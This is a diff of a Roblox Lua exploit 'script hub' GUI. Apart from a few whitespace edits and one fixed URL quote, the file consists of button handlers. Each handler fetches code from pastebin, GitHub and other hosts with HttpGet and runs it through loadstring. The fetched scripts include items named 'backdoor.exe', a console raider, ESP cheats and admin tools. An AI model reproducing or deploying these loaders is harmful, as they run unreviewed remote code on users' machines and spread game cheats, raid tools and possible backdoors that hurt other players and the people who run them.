@@ -461,7 +461,7 @@ local function WQCZI_fake_script() -- Back1.Script
 	local script = Instance.new('Script', Back1)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 	end)
@@ -471,7 +471,7 @@ local function UXUQP_fake_script() -- c10.Script
 	local script = Instance.new('Script', c10)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
 	end)
@@ -481,7 +481,7 @@ local function WMDCIMQ_fake_script() -- c2.Script
 	local script = Instance.new('Script', c2)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/Q0VdG4AL"))()
 	end)
@@ -491,7 +491,7 @@ local function BWTGIJF_fake_script() -- c3.Script
 	local script = Instance.new('Script', c3)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/MfAz4qdH"))()
 	end)
@@ -501,7 +501,7 @@ local function ZSIBBBX_fake_script() -- Back2.Script
 	local script = Instance.new('Script', Back2)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/Camera%20Sliders.lua"))()
 	end)
@@ -511,7 +511,7 @@ local function MWRNQ_fake_script() -- c100.Script
 	local script = Instance.new('Script', c100)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/RGB%20Bubble%20chat.Lua"))()
 	end)
@@ -521,7 +521,7 @@ local function XGBK_fake_script() -- c20.Script
 	local script = Instance.new('Script', c20)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/rejoin%20button%20for%20kick%20message.lua"))()
 	end)
@@ -531,7 +531,7 @@ local function HRIZXT_fake_script() -- c30.Script
 	local script = Instance.new('Script', c30)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/RW7ZT29m"))()
 	end)
@@ -541,7 +541,7 @@ local function YZZBWV_fake_script() -- c300.Script
 	local script = Instance.new('Script', c300)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://scripts.luawl.com/Main/ScourgeVehicleMods.lua%27'))()
 	end)
@@ -551,7 +551,7 @@ local function MWJSCO_fake_script() -- c200.Script
 	local script = Instance.new('Script', c200)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/Local%20Full%20Player%20Collision.Lua"))()
 	end)
@@ -561,7 +561,7 @@ local function BRASY_fake_script() -- c1.Script
 	local script = Instance.new('Script', c1)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/VH3Ew6Y5"))()
 	end)
@@ -571,7 +571,7 @@ local function DMWXWW_fake_script() -- Back3.Script
 	local script = Instance.new('Script', Back3)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet(('https://pastebin.com/raw/PZbnE4Fj'),true))() 
 	end)
@@ -581,7 +581,7 @@ local function PDGNJEH_fake_script() -- c3000.Script
 	local script = Instance.new('Script', c3000)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tropxzz/Scripts/main/REE%20CONSOLE%20RAIDER%20FIXED", true))()
 	end)
@@ -591,7 +591,7 @@ local function VLPZ_fake_script() -- c2000.Script
 	local script = Instance.new('Script', c2000)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/antisteal/antisteal-main/master/ui.lua', true))()
 	end)
@@ -601,7 +601,7 @@ local function IAGOIE_fake_script() -- c1000.Script
 	local script = Instance.new('Script', c1000)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunix1747/ModdedPineapple/main/Pine"))()
 	end)
@@ -611,7 +611,7 @@ local function MASRL_fake_script() -- Back4.Script
 	local script = Instance.new('Script', Back4)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/wN9Q3pZm",true))()
 	end)
@@ -621,7 +621,7 @@ local function FGYJH_fake_script() -- GameHub.Script
 	local script = Instance.new('Script', GameHub)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
 	end)
@@ -631,7 +631,7 @@ local function HOLLD_fake_script() -- c30000.Script
 	local script = Instance.new('Script', c30000)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://pastebin.com/raw/PVsWsk86"))()
 	end)
@@ -641,7 +641,7 @@ local function PTEES_fake_script() -- why11.Script
 	local script = Instance.new('Script', why11)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
 	end)
@@ -651,7 +651,7 @@ local function MKUVL_fake_script() -- why1.Script
 	local script = Instance.new('Script', why1)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))()
 	end)
@@ -661,7 +661,7 @@ local function JEBXMWN_fake_script() -- why10.Script
 	local script = Instance.new('Script', why10)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/99606f43e2dac85f6afc1d93d0a02d2d.lua%22"))()
 	end)
@@ -671,7 +671,7 @@ local function EOWUQGO_fake_script() -- why9.Script
 	local script = Instance.new('Script', why9)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/OfficialSolarFlare/NexusX/main/Protected_9691923056636055.lua'))()
 	end)
@@ -681,7 +681,7 @@ local function BLDIH_fake_script() -- why7.Script
 	local script = Instance.new('Script', why7)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/phonkScripts/PhonkScripts/main/dingus%20esp"))()
 	end)
@@ -691,7 +691,7 @@ local function IPAL_fake_script() -- why6.Script
 	local script = Instance.new('Script', why6)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/tiyixif29josda/Universal-Script/main/Notesv2"))
 	end)
@@ -701,9 +701,9 @@ local function OERZHC_fake_script() -- why3.Script
 	local script = Instance.new('Script', why3)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/hBwPY8pe%22))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/hBwPY8pe%22"))()
 	end)
 end
 coroutine.wrap(OERZHC_fake_script)()
@@ -711,7 +711,7 @@ local function CMKVCDD_fake_script() -- why8.Script
 	local script = Instance.new('Script', why8)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
 	end)
@@ -721,7 +721,7 @@ local function IHMUOEC_fake_script() -- why2.Script
 	local script = Instance.new('Script', why2)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarWareOP/Animation-Changer-Source/main/Script", true))()
 	end)
@@ -731,7 +731,7 @@ local function DVPKYP_fake_script() -- why5.Script
 	local script = Instance.new('Script', why5)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://vadrifts.dev/versions/current"))()
 	end)
@@ -741,7 +741,7 @@ local function ZUDQ_fake_script() -- why4.Script
 	local script = Instance.new('Script', why4)
 
 	local CH = script.Parent
-	
+
 	CH.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tropxzz/SweatDestroyer/main/MainOperator.lua", true))()
 	end)
